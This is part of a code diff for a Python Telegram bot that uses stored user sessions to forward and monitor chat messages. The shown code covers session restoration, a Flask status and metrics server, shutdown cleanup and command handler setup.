+            asyncio.create_task(resolve_targets_for_user(user_id, unique_targets))
+
+async def start_monitoring_for_user(user_id: int):
+    if user_id not in user_clients:
+        logger.warning(f"User {user_id} not in user_clients")
+        return
+    
+    client = user_clients[user_id]
+    monitoring_tasks_cache.setdefault(user_id, [])
+    chat_entity_cache.setdefault(user_id, {})
+    
+    await update_monitoring_for_user(user_id)
+
+async def update_forwarding_for_user(user_id: int):
+    if user_id not in user_clients:
+        return
+    
+    client = user_clients[user_id]
+    
+    # Re-register forwarding handler
+    if user_id in forward_handler_registered:
+        handler = forward_handler_registered.get(user_id)
+        if handler:
+            try:
+                client.remove_event_handler(handler)
+            except Exception:
+                pass
+        forward_handler_registered.pop(user_id, None)
+    
+    ensure_forward_handler_registered_for_user(user_id, client)
+    
+    # Resolve targets
+    user_tasks = forwarding_tasks_cache.get(user_id, [])
+    if user_tasks:
+        all_targets = []
+        for task in user_tasks:
+            all_targets.extend(task.get("target_ids", []))
+        
+        if all_targets:
+            unique_targets = list(set(all_targets))
+            asyncio.create_task(resolve_targets_for_user(user_id, unique_targets))
+
+async def restore_sessions():
+    logger.info("🔄 Restoring sessions...")
+
+    # Restore from environment
+    for user_id, session_string in USER_SESSIONS.items():
+        if len(user_clients) >= MAX_CONCURRENT_USERS:
+            continue
+            
+        try:
+            await restore_single_session(user_id, session_string, from_env=True)
+        except Exception:
+            pass
+
+    # Restore from database
+    try:
+        users = await asyncio.to_thread(lambda: db.get_logged_in_users(MAX_CONCURRENT_USERS * 2))
+    except Exception:
+        users = []
+
+    # Load forwarding tasks
+    try:
+        all_forward_active = await db_call(db.get_all_active_forwarding_tasks)
+    except Exception:
+        all_forward_active = []
+
+    # Load monitoring tasks
+    try:
+        all_monitor_active = await db_call(db.get_all_active_monitoring_tasks)
+    except Exception:
+        all_monitor_active = []
+
+    # Clear and populate caches
+    forwarding_tasks_cache.clear()
+    monitoring_tasks_cache.clear()
+    
+    for t in all_forward_active:
+        uid = t["user_id"]
+        forwarding_tasks_cache.setdefault(uid, []).append({
+            "id": t["id"], 
+            "label": t["label"], 
+            "source_ids": t["source_ids"], 
+            "target_ids": t["target_ids"], 
+            "is_active": 1,
+            "filters": t.get("filters", {})
+        })
+    
+    for t in all_monitor_active:
+        uid = t["user_id"]
+        monitoring_tasks_cache.setdefault(uid, []).append({
+            "id": t["id"],
+            "label": t["label"],
+            "chat_ids": t["chat_ids"],
+            "is_active": 1,
+            "settings": t.get("settings", {})
+        })
+
+    # Restore sessions in batches
+    batch_size = 3
+    restore_tasks = []
+    for row in users:
+        try:
+            user_id = row.get("user_id") if isinstance(row, dict) else row[0]
+            session_data = row.get("session_data") if isinstance(row, dict) else row[1]
+        except Exception:
+            continue
+
+        if session_data and user_id not in user_clients:
+            restore_tasks.append(restore_single_session(user_id, session_data, from_env=False))
+
+        if len(restore_tasks) >= batch_size:
+            await asyncio.gather(*restore_tasks, return_exceptions=True)
+            restore_tasks = []
+            await asyncio.sleep(0.5)
+    
+    if restore_tasks:
+        await asyncio.gather(*restore_tasks, return_exceptions=True)
+
+async def restore_single_session(user_id: int, session_data: str, from_env: bool = False):
+    try:
+        client = TelegramClient(StringSession(session_data), API_ID, API_HASH)
+        await client.connect()
+
+        if await client.is_user_authorized():
+            if len(user_clients) >= MAX_CONCURRENT_USERS:
+                try:
+                    await client.disconnect()
+                except Exception:
+                    pass
+                if not from_env:
+                    await db_call(db.save_user, user_id, None, None, None, True)
+                return
+
+            user_clients[user_id] = client
+            
+            try:
+                me = await client.get_me()
+                user_name = me.first_name or "User"
+                
+                user = await db_call(db.get_user, user_id)
+                has_phone = user and user.get("phone")
+                
+                await db_call(db.save_user, user_id, 
+                            user["phone"] if user else None,
+                            user_name, 
+                            session_data, 
+                            True)
+                
+                # Initialize caches
+                target_entity_cache.setdefault(user_id, OrderedDict())
+                chat_entity_cache.setdefault(user_id, {})
+                _ensure_user_send_semaphore(user_id)
+                _ensure_user_rate_limiter(user_id)
+                
+                # Start both systems
+                await start_forwarding_for_user(user_id)
+                await start_monitoring_for_user(user_id)
+                
+                # Resolve targets for forwarding
+                user_forward_tasks = forwarding_tasks_cache.get(user_id, [])
+                if user_forward_tasks:
+                    all_targets = []
+                    for tt in user_forward_tasks:
+                        all_targets.extend(tt.get("target_ids", []))
+                    
+                    if all_targets:
+                        unique_targets = list(set(all_targets))
+                        asyncio.create_task(resolve_targets_for_user(user_id, unique_targets))
+                
+                source = "environment variable" if from_env else "database"
+                logger.info(f"✅ Restored session for user {user_id} from {source}")
+                
+            except Exception as e:
+                logger.exception(f"Error in restore_single_session for user {user_id}: {e}")
+                try:
+                    target_entity_cache.setdefault(user_id, OrderedDict())
+                    chat_entity_cache.setdefault(user_id, {})
+                    _ensure_user_send_semaphore(user_id)
+                    _ensure_user_rate_limiter(user_id)
+                    await start_forwarding_for_user(user_id)
+                    await start_monitoring_for_user(user_id)
+                except Exception:
+                    pass
+        else:
+            if not from_env:
+                await db_call(db.save_user, user_id, None, None, None, False)
+    except Exception as e:
+        logger.exception(f"Failed to restore session for user {user_id}: {e}")
+        if not from_env:
+            try:
+                await db_call(db.save_user, user_id, None, None, None, False)
+            except Exception:
+                pass
+
+# ============================
+# WEB SERVER
+# ============================
+class WebServer:
+    
+    def __init__(self, port: int = 5000):
+        self.port = port
+        self.app = Flask(__name__)
+        self.start_time = time.time()
+        self._monitor_callback = None
+        self._cached_container_limit_mb = None
+        self.setup_routes()
+    
+    def register_monitoring(self, callback):
+        self._monitor_callback = callback
+        logger.info("Monitoring callback registered")
+    
+    def _mb_from_bytes(self, n_bytes: int) -> float:
+        return round(n_bytes / (1024 * 1024), 2)
+    
+    def _read_cgroup_memory_limit_bytes(self) -> int:
+        candidates = [
+            "/sys/fs/cgroup/memory.max",
+            "/sys/fs/cgroup/memory/memory.limit_in_bytes",
+        ]
+
+        for path in candidates:
+            try:
+                if not os.path.exists(path):
+                    continue
+                with open(path, "r") as fh:
+                    raw = fh.read().strip()
+                if raw == "max":
+                    return 0
+                val = int(raw)
+                if val <= 0:
+                    return 0
+                if val > (1 << 50):
+                    return 0
+                return val
+            except Exception:
+                continue
+
+        try:
+            with open("/proc/self/cgroup", "r") as fh:
+                lines = fh.read().splitlines()
+            for ln in lines:
+                parts = ln.split(":")
+                if len(parts) >= 3:
+                    controllers = parts[1]
+                    cpath = parts[2]
+                    if "memory" in controllers.split(","):
+                        possible = f"/sys/fs/cgroup/memory{cpath}/memory.limit_in_bytes"
+                        if os.path.exists(possible):
+                            with open(possible, "r") as fh:
+                                raw = fh.read().strip()
+                            val = int(raw)
+                            if val > 0 and val < (1 << 50):
+                                return val
+                        possible2 = f"/sys/fs/cgroup{cpath}/memory.max"
+                        if os.path.exists(possible2):
+                            with open(possible2, "r") as fh:
+                                raw = fh.read().strip()
+                            if raw != "max":
+                                val = int(raw)
+                                if val > 0 and val < (1 << 50):
+                                    return val
+        except Exception:
+            pass
+
+        return 0
+    
+    def get_container_memory_limit_mb(self) -> float:
+        if self._cached_container_limit_mb is not None:
+            return self._cached_container_limit_mb
+
+        bytes_limit = self._read_cgroup_memory_limit_bytes()
+        if bytes_limit and bytes_limit > 0:
+            self._cached_container_limit_mb = self._mb_from_bytes(bytes_limit)
+        else:
+            self._cached_container_limit_mb = float(os.getenv("CONTAINER_MAX_RAM_MB", str(DEFAULT_CONTAINER_MAX_RAM_MB)))
+        return self._cached_container_limit_mb
+    
+    def setup_routes(self):
+        
+        @self.app.route("/", methods=["GET"])
+        def home():
+            container_limit = self.get_container_memory_limit_mb()
+            html = f"""
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Forwarder + DuoDetective Bot Status</title>
+                <style>
+                    body {{
+                        font-family: Arial, sans-serif;
+                        text-align: center;
+                        padding: 50px;
+                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                        color: white;
+                    }}
+                    .status {{
+                        background: rgba(255,255,255,0.1);
+                        padding: 30px;
+                        border-radius: 15px;
+                        max-width: 600px;
+                        margin: 0 auto;
+                        text-align: left;
+                    }}
+                    h1 {{ font-size: 2.2em; margin: 0; text-align: center; }}
+                    p {{ font-size: 1.0em; }}
+                    .emoji {{ font-size: 2.5em; text-align: center; }}
+                    .stats {{ font-family: monospace; margin-top: 12px; }}
+                </style>
+            </head>
+            <body>
+                <div class="status">
+                    <div class="emoji">🤖🔍</div>
+                    <h1>Forwarder + DuoDetective Bot</h1>
+                    <p>Combined bot is running. Use the monitoring endpoints:</p>
+                    <ul>
+                      <li>/health — basic uptime</li>
+                      <li>/webhook — simple webhook endpoint</li>
+                      <li>/metrics — system metrics</li>
+                    </ul>
+                    <div class="stats">
+                      <strong>Container memory limit (detected):</strong> {container_limit} MB
+                    </div>
+                </div>
+            </body>
+            </html>
+            """
+            return html
+        
+        @self.app.route("/health", methods=["GET"])
+        def health():
+            uptime = int(time.time() - self.start_time)
+            return jsonify({"status": "healthy", "uptime_seconds": uptime}), 200
+        
+        @self.app.route("/webhook", methods=["GET", "POST"])
+        def webhook():
+            now = int(time.time())
+            if request.method == "POST":
+                data = request.get_json(silent=True)
+                return jsonify({"status": "ok", "received": True, "timestamp": now, "data": data}), 200
+            else:
+                return jsonify({"status": "ok", "method": "GET", "timestamp": now}), 200
+        
+        @self.app.route("/metrics", methods=["GET"])
+        def metrics():
+            if self._monitor_callback is None:
+                return jsonify({"status": "unavailable", "reason": "no monitor registered"}), 200
+
+            try:
+                data = self._monitor_callback()
+                return jsonify({"status": "ok", "metrics": data}), 200
+            except Exception as e:
+                logger.exception("Monitoring callback failed")
+                return jsonify({"status": "error", "error": str(e)}), 500
+    
+    def run_server(self):
+        self.app.run(host="0.0.0.0", port=self.port, debug=False, use_reloader=False, threaded=True)
+    
+    def start(self):
+        server_thread = threading.Thread(target=self.run_server, daemon=True)
+        server_thread.start()
+        logger.info(f"🌐 Web server started on port {self.port}")
+
+web_server = WebServer(port=WEB_SERVER_PORT)
+
+# ============================
+# SHUTDOWN & CLEANUP
+# ============================
+async def shutdown_cleanup():
+    logger.info("Shutdown cleanup...")
+
+    # Cancel worker tasks
+    for t in list(send_worker_tasks):
+        try:
+            t.cancel()
+        except Exception:
+            pass
+    
+    for t in list(monitor_worker_tasks):
+        try:
+            t.cancel()
+        except Exception:
+            pass
+    
+    if send_worker_tasks or monitor_worker_tasks:
+        try:
+            await asyncio.gather(*send_worker_tasks, *monitor_worker_tasks, return_exceptions=True)
+        except Exception:
+            pass
+
+    # Disconnect all clients
+    user_ids = list(user_clients.keys())
+    batch_size = 5
+    for i in range(0, len(user_ids), batch_size):
+        batch = user_ids[i:i + batch_size]
+        disconnect_tasks = []
+        for uid in batch:
+            client = user_clients.get(uid)
+            if not client:
+                continue
+
+            # Remove forwarding handler
+            if uid in forward_handler_registered:
+                handler = forward_handler_registered.get(uid)
+                if handler:
+                    try:
+                        client.remove_event_handler(handler)
+                    except Exception:
+                        pass
+                forward_handler_registered.pop(uid, None)
+            
+            # Remove monitoring handlers
+            if uid in monitor_handler_registered:
+                for handler in monitor_handler_registered[uid]:
+                    try:
+                        client.remove_event_handler(handler)
+                    except Exception:
+                        pass
+                monitor_handler_registered.pop(uid, None)
+
+            try:
+                disconnect_tasks.append(client.disconnect())
+            except Exception:
+                try:
+                    sess = getattr(client, "session", None)
+                    if sess is not None:
+                        try:
+                            sess.close()
+                        except Exception:
+                            pass
+                except Exception:
+                    pass
+
+        if disconnect_tasks:
+            try:
+                await asyncio.gather(*disconnect_tasks, return_exceptions=True)
+            except Exception:
+                pass
+
+    # Clear all caches
+    user_clients.clear()
+    forwarding_tasks_cache.clear()
+    monitoring_tasks_cache.clear()
+    phone_verification_states.clear()
+    target_entity_cache.clear()
+    chat_entity_cache.clear()
+    user_send_semaphores.clear()
+    user_rate_limiters.clear()
+    message_history.clear()
+    notification_messages.clear()
+    reply_states.clear()
+    auto_reply_states.clear()
+
+    try:
+        db.close_connection()
+    except Exception:
+        pass
+
+    logger.info("Shutdown cleanup complete.")
+
+async def handle_all_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if user_id in phone_verification_states:
+        await handle_phone_verification(update, context)
+        return
+    
+    if context.user_data.get("awaiting_input"):
+        action = context.user_data.get("owner_action")
+        
+        if action == "get_user_string":
+            await handle_get_user_string(update, context)
+        elif action == "add_user":
+            await handle_add_user(update, context)
+        elif action == "remove_user":
+            await handle_remove_user(update, context)
+        return
+    
+    if user_id in login_states:
+        await handle_login_process(update, context)
+        return
+    
+    if user_id in task_creation_states:
+        await handle_task_creation(update, context)
+        return
+    
+    if context.user_data.get("waiting_prefix") or context.user_data.get("waiting_suffix"):
+        await handle_prefix_suffix_input(update, context)
+        return
+    
+    if any(key.startswith("waiting_auto_reply_") for key in context.user_data.keys()):
+        await handle_auto_reply_message(update, context)
+        return
+    
+    if update.message.reply_to_message:
+        await handle_notification_reply(update, context)
+        return
+    
+    if user_id in logout_states:
+        handled = await handle_logout_confirmation(update, context)
+        if handled:
+            return
+    
+    if await check_phone_number_required(user_id):
+        await ask_for_phone_number(user_id, update.message.chat.id, context)
+        return
+    
+    await update.message.reply_text(
+        "🤔 **I didn't understand that command.**\n\nUse /start to see available commands.",
+        parse_mode="Markdown"
+    )
+
+# ============================
+# MAIN INITIALIZATION
+# ============================
+async def post_init(application: Application):
+    global MAIN_LOOP
+    MAIN_LOOP = asyncio.get_running_loop()
+
+    logger.info("🔧 Initializing combined bot...")
+
+    await application.bot.delete_webhook(drop_pending_updates=True)
+    logger.info("🧹 Cleared webhooks")
+
+    def _signal_handler(sig_num, frame):
+        logger.info(f"Signal {sig_num} received")
+        try:
+            if MAIN_LOOP is not None and getattr(MAIN_LOOP, "is_running", lambda: False)():
+                future = asyncio.run_coroutine_threadsafe(_graceful_shutdown(application), MAIN_LOOP)
+                try:
+                    future.result(timeout=30)
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+    try:
+        signal.signal(signal.SIGINT, _signal_handler)
+        signal.signal(signal.SIGTERM, _signal_handler)
+    except Exception:
+        pass
+
+    # Add owner IDs to allowed users
+    if OWNER_IDS:
+        for oid in OWNER_IDS:
+            try:
+                is_admin = await db_call(db.is_user_admin, oid)
+                if not is_admin:
+                    await db_call(db.add_allowed_user, oid, None, True, None)
+            except Exception:
+                pass
+
+    # Add allowed users from environment
+    if ALLOWED_USERS:
+        for au in ALLOWED_USERS:
+            try:
+                await db_call(db.add_allowed_user, au, None, False, None)
+            except Exception:
+                pass
+
+    # Start worker systems
+    await start_send_workers()
+    await start_monitor_workers()
+    
+    # Start monitoring tasks
+    asyncio.create_task(monitor_queue_health())
+    asyncio.create_task(performance_logger())
+    
+    # Restore sessions
+    await restore_sessions()
+
+    # Setup metrics collection
+    async def _collect_metrics():
+        try:
+            send_q = send_queue.qsize() if send_queue is not None else None
+            notify_q = notification_queue.qsize() if notification_queue is not None else None
+            
+            return {
+                "send_queue_size": send_q,
+                "notification_queue_size": notify_q,
+                "send_worker_count": len(send_worker_tasks),
+                "monitor_worker_count": len(monitor_worker_tasks),
+                "active_user_clients_count": len(user_clients),
+                "forwarding_tasks_counts": {uid: len(forwarding_tasks_cache.get(uid, [])) for uid in list(forwarding_tasks_cache.keys())[:10]},
+                "monitoring_tasks_counts": {uid: len(monitoring_tasks_cache.get(uid, [])) for uid in list(monitoring_tasks_cache.keys())[:10]},
+                "message_history_size": sum(len(v) for v in message_history.values()),
+                "duplicate_window_seconds": DUPLICATE_CHECK_WINDOW,
+                "max_users": MAX_CONCURRENT_USERS,
+            }
+        except Exception as e:
+            return {"error": f"failed to collect metrics: {e}"}
+
+    def _forward_metrics():
+        if MAIN_LOOP is not None:
+            try:
+                future = asyncio.run_coroutine_threadsafe(_collect_metrics(), MAIN_LOOP)
+                return future.result(timeout=1.0)
+            except Exception:
+                return {"error": "failed to collect metrics"}
+        else:
+            return {"error": "bot main loop not available"}
+
+    try:
+        web_server.register_monitoring(_forward_metrics)
+    except Exception:
+        pass
+
+    web_server.start()
+    
+    logger.info("✅ Combined bot initialized!")
+
+async def _graceful_shutdown(application: Application):
+    try:
+        await shutdown_cleanup()
+    except Exception:
+        pass
+    try:
+        await application.stop()
+    except Exception:
+        pass
+
+# ============================
+# MAIN ENTRY POINT
+# ============================
+def main():
+    if not BOT_TOKEN:
+        logger.error("❌ BOT_TOKEN not found")
+        return
+
+    if not API_ID or not API_HASH:
+        logger.error("❌ API_ID or API_HASH not found")
+        return
+
+    logger.info("🤖 Starting Forwarder + DuoDetective Bot...")
+    logger.info(f"📊 Loaded {len(USER_SESSIONS)} string sessions from environment")
+
+    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
+
+    # Add handlers
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("login", login_command))
+    application.add_handler(CommandHandler("logout", logout_command))
+    application.add_handler(CommandHandler("forwadd", forwadd_command))
+    application.add_handler(CommandHandler("fortasks", fortasks_command))
+    application.add_handler(CommandHandler("monitoradd", monitoradd_command))
+    application.add_handler(CommandHandler("monitortasks", monitortasks_command))
+    application.add_handler(CommandHandler("getallid", getallid_command))
+    application.add_handler(CommandHandler("ownersets", ownersets_command))
+    application.add_handler(CallbackQueryHandler(button_handler))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_text_messages))
+
+    logger.info("✅ Bot ready!")
+    try:
+        application.run_polling(drop_pending_updates=True)
+    finally:
+        loop_to_use = None
+        try:
+            if MAIN_LOOP is not None and getattr(MAIN_LOOP, "is_running", lambda: False)():
+                loop_to_use = MAIN_LOOP
+            else:
+                try:
+                    running_loop = asyncio.get_running_loop()
+                    if getattr(running_loop, "is_running", lambda: False)():
+                        loop_to_use = running_loop
+                except RuntimeError:
+                    loop_to_use = None
+        except Exception:
+            loop_to_use = None
+
+        if loop_to_use:
+            try:
+                future = asyncio.run_coroutine_threadsafe(shutdown_cleanup(), loop_to_use)
+                future.result(timeout=30)
+            except Exception:
+                pass
+        else:
+            tmp_loop = asyncio.new_event_loop()
+            try:
+                asyncio.set_event_loop(tmp_loop)
+                tmp_loop.run_until_complete(shutdown_cleanup())
+            finally:
+                try:
+                    tmp_loop.close()
+                except Exception:
+                    pass
 
 if __name__ == "__main__":
     main()
